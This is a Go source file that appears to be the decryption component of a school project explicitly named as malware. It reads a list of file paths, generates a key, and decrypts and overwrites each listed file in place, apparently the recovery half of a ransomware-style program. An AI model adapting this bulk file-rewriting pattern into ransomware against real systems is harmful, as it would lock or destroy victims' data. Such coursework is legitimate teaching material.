package decryption

import (
	"fmt"
	"os"
	"school-task-malware/encryption"
	"school-task-malware/utility"
	"strings"
)

func Start() {
	filePath := "./data/file_paths.txt"
	lines, err := utility.ReadLinesFromFile(filePath)
	if err != nil {
		fmt.Println("Error reading file:", err)
		return
	}

	key, err := encryption.GenerateEncryptionKey()
	if err != nil {
		panic(err)
	}
	// Print the generated encryption key
	fmt.Println("Generated Encryption Key:", key)

	// Print each line
	for _, line := range lines {
		//if file name file_paths.txt is found, skip it
		if strings.Contains(line, "file_paths.txt") {
			fmt.Println("Skipping file:", line)
			continue
		}
		// get file data
		data, err := os.ReadFile(line)
		if err != nil {
			fmt.Println("Error reading file:", err)
			return
		}

		decypted, err := Decrypt(data, key)
		if err != nil {
			fmt.Println("File:", line)
			fmt.Println("Error decrypting data:", err)
			return
		}
		err = os.WriteFile(line, decypted, 0644)
		if err != nil {
			fmt.Println("Error writing to file:", err)
			return
		}
	}
}
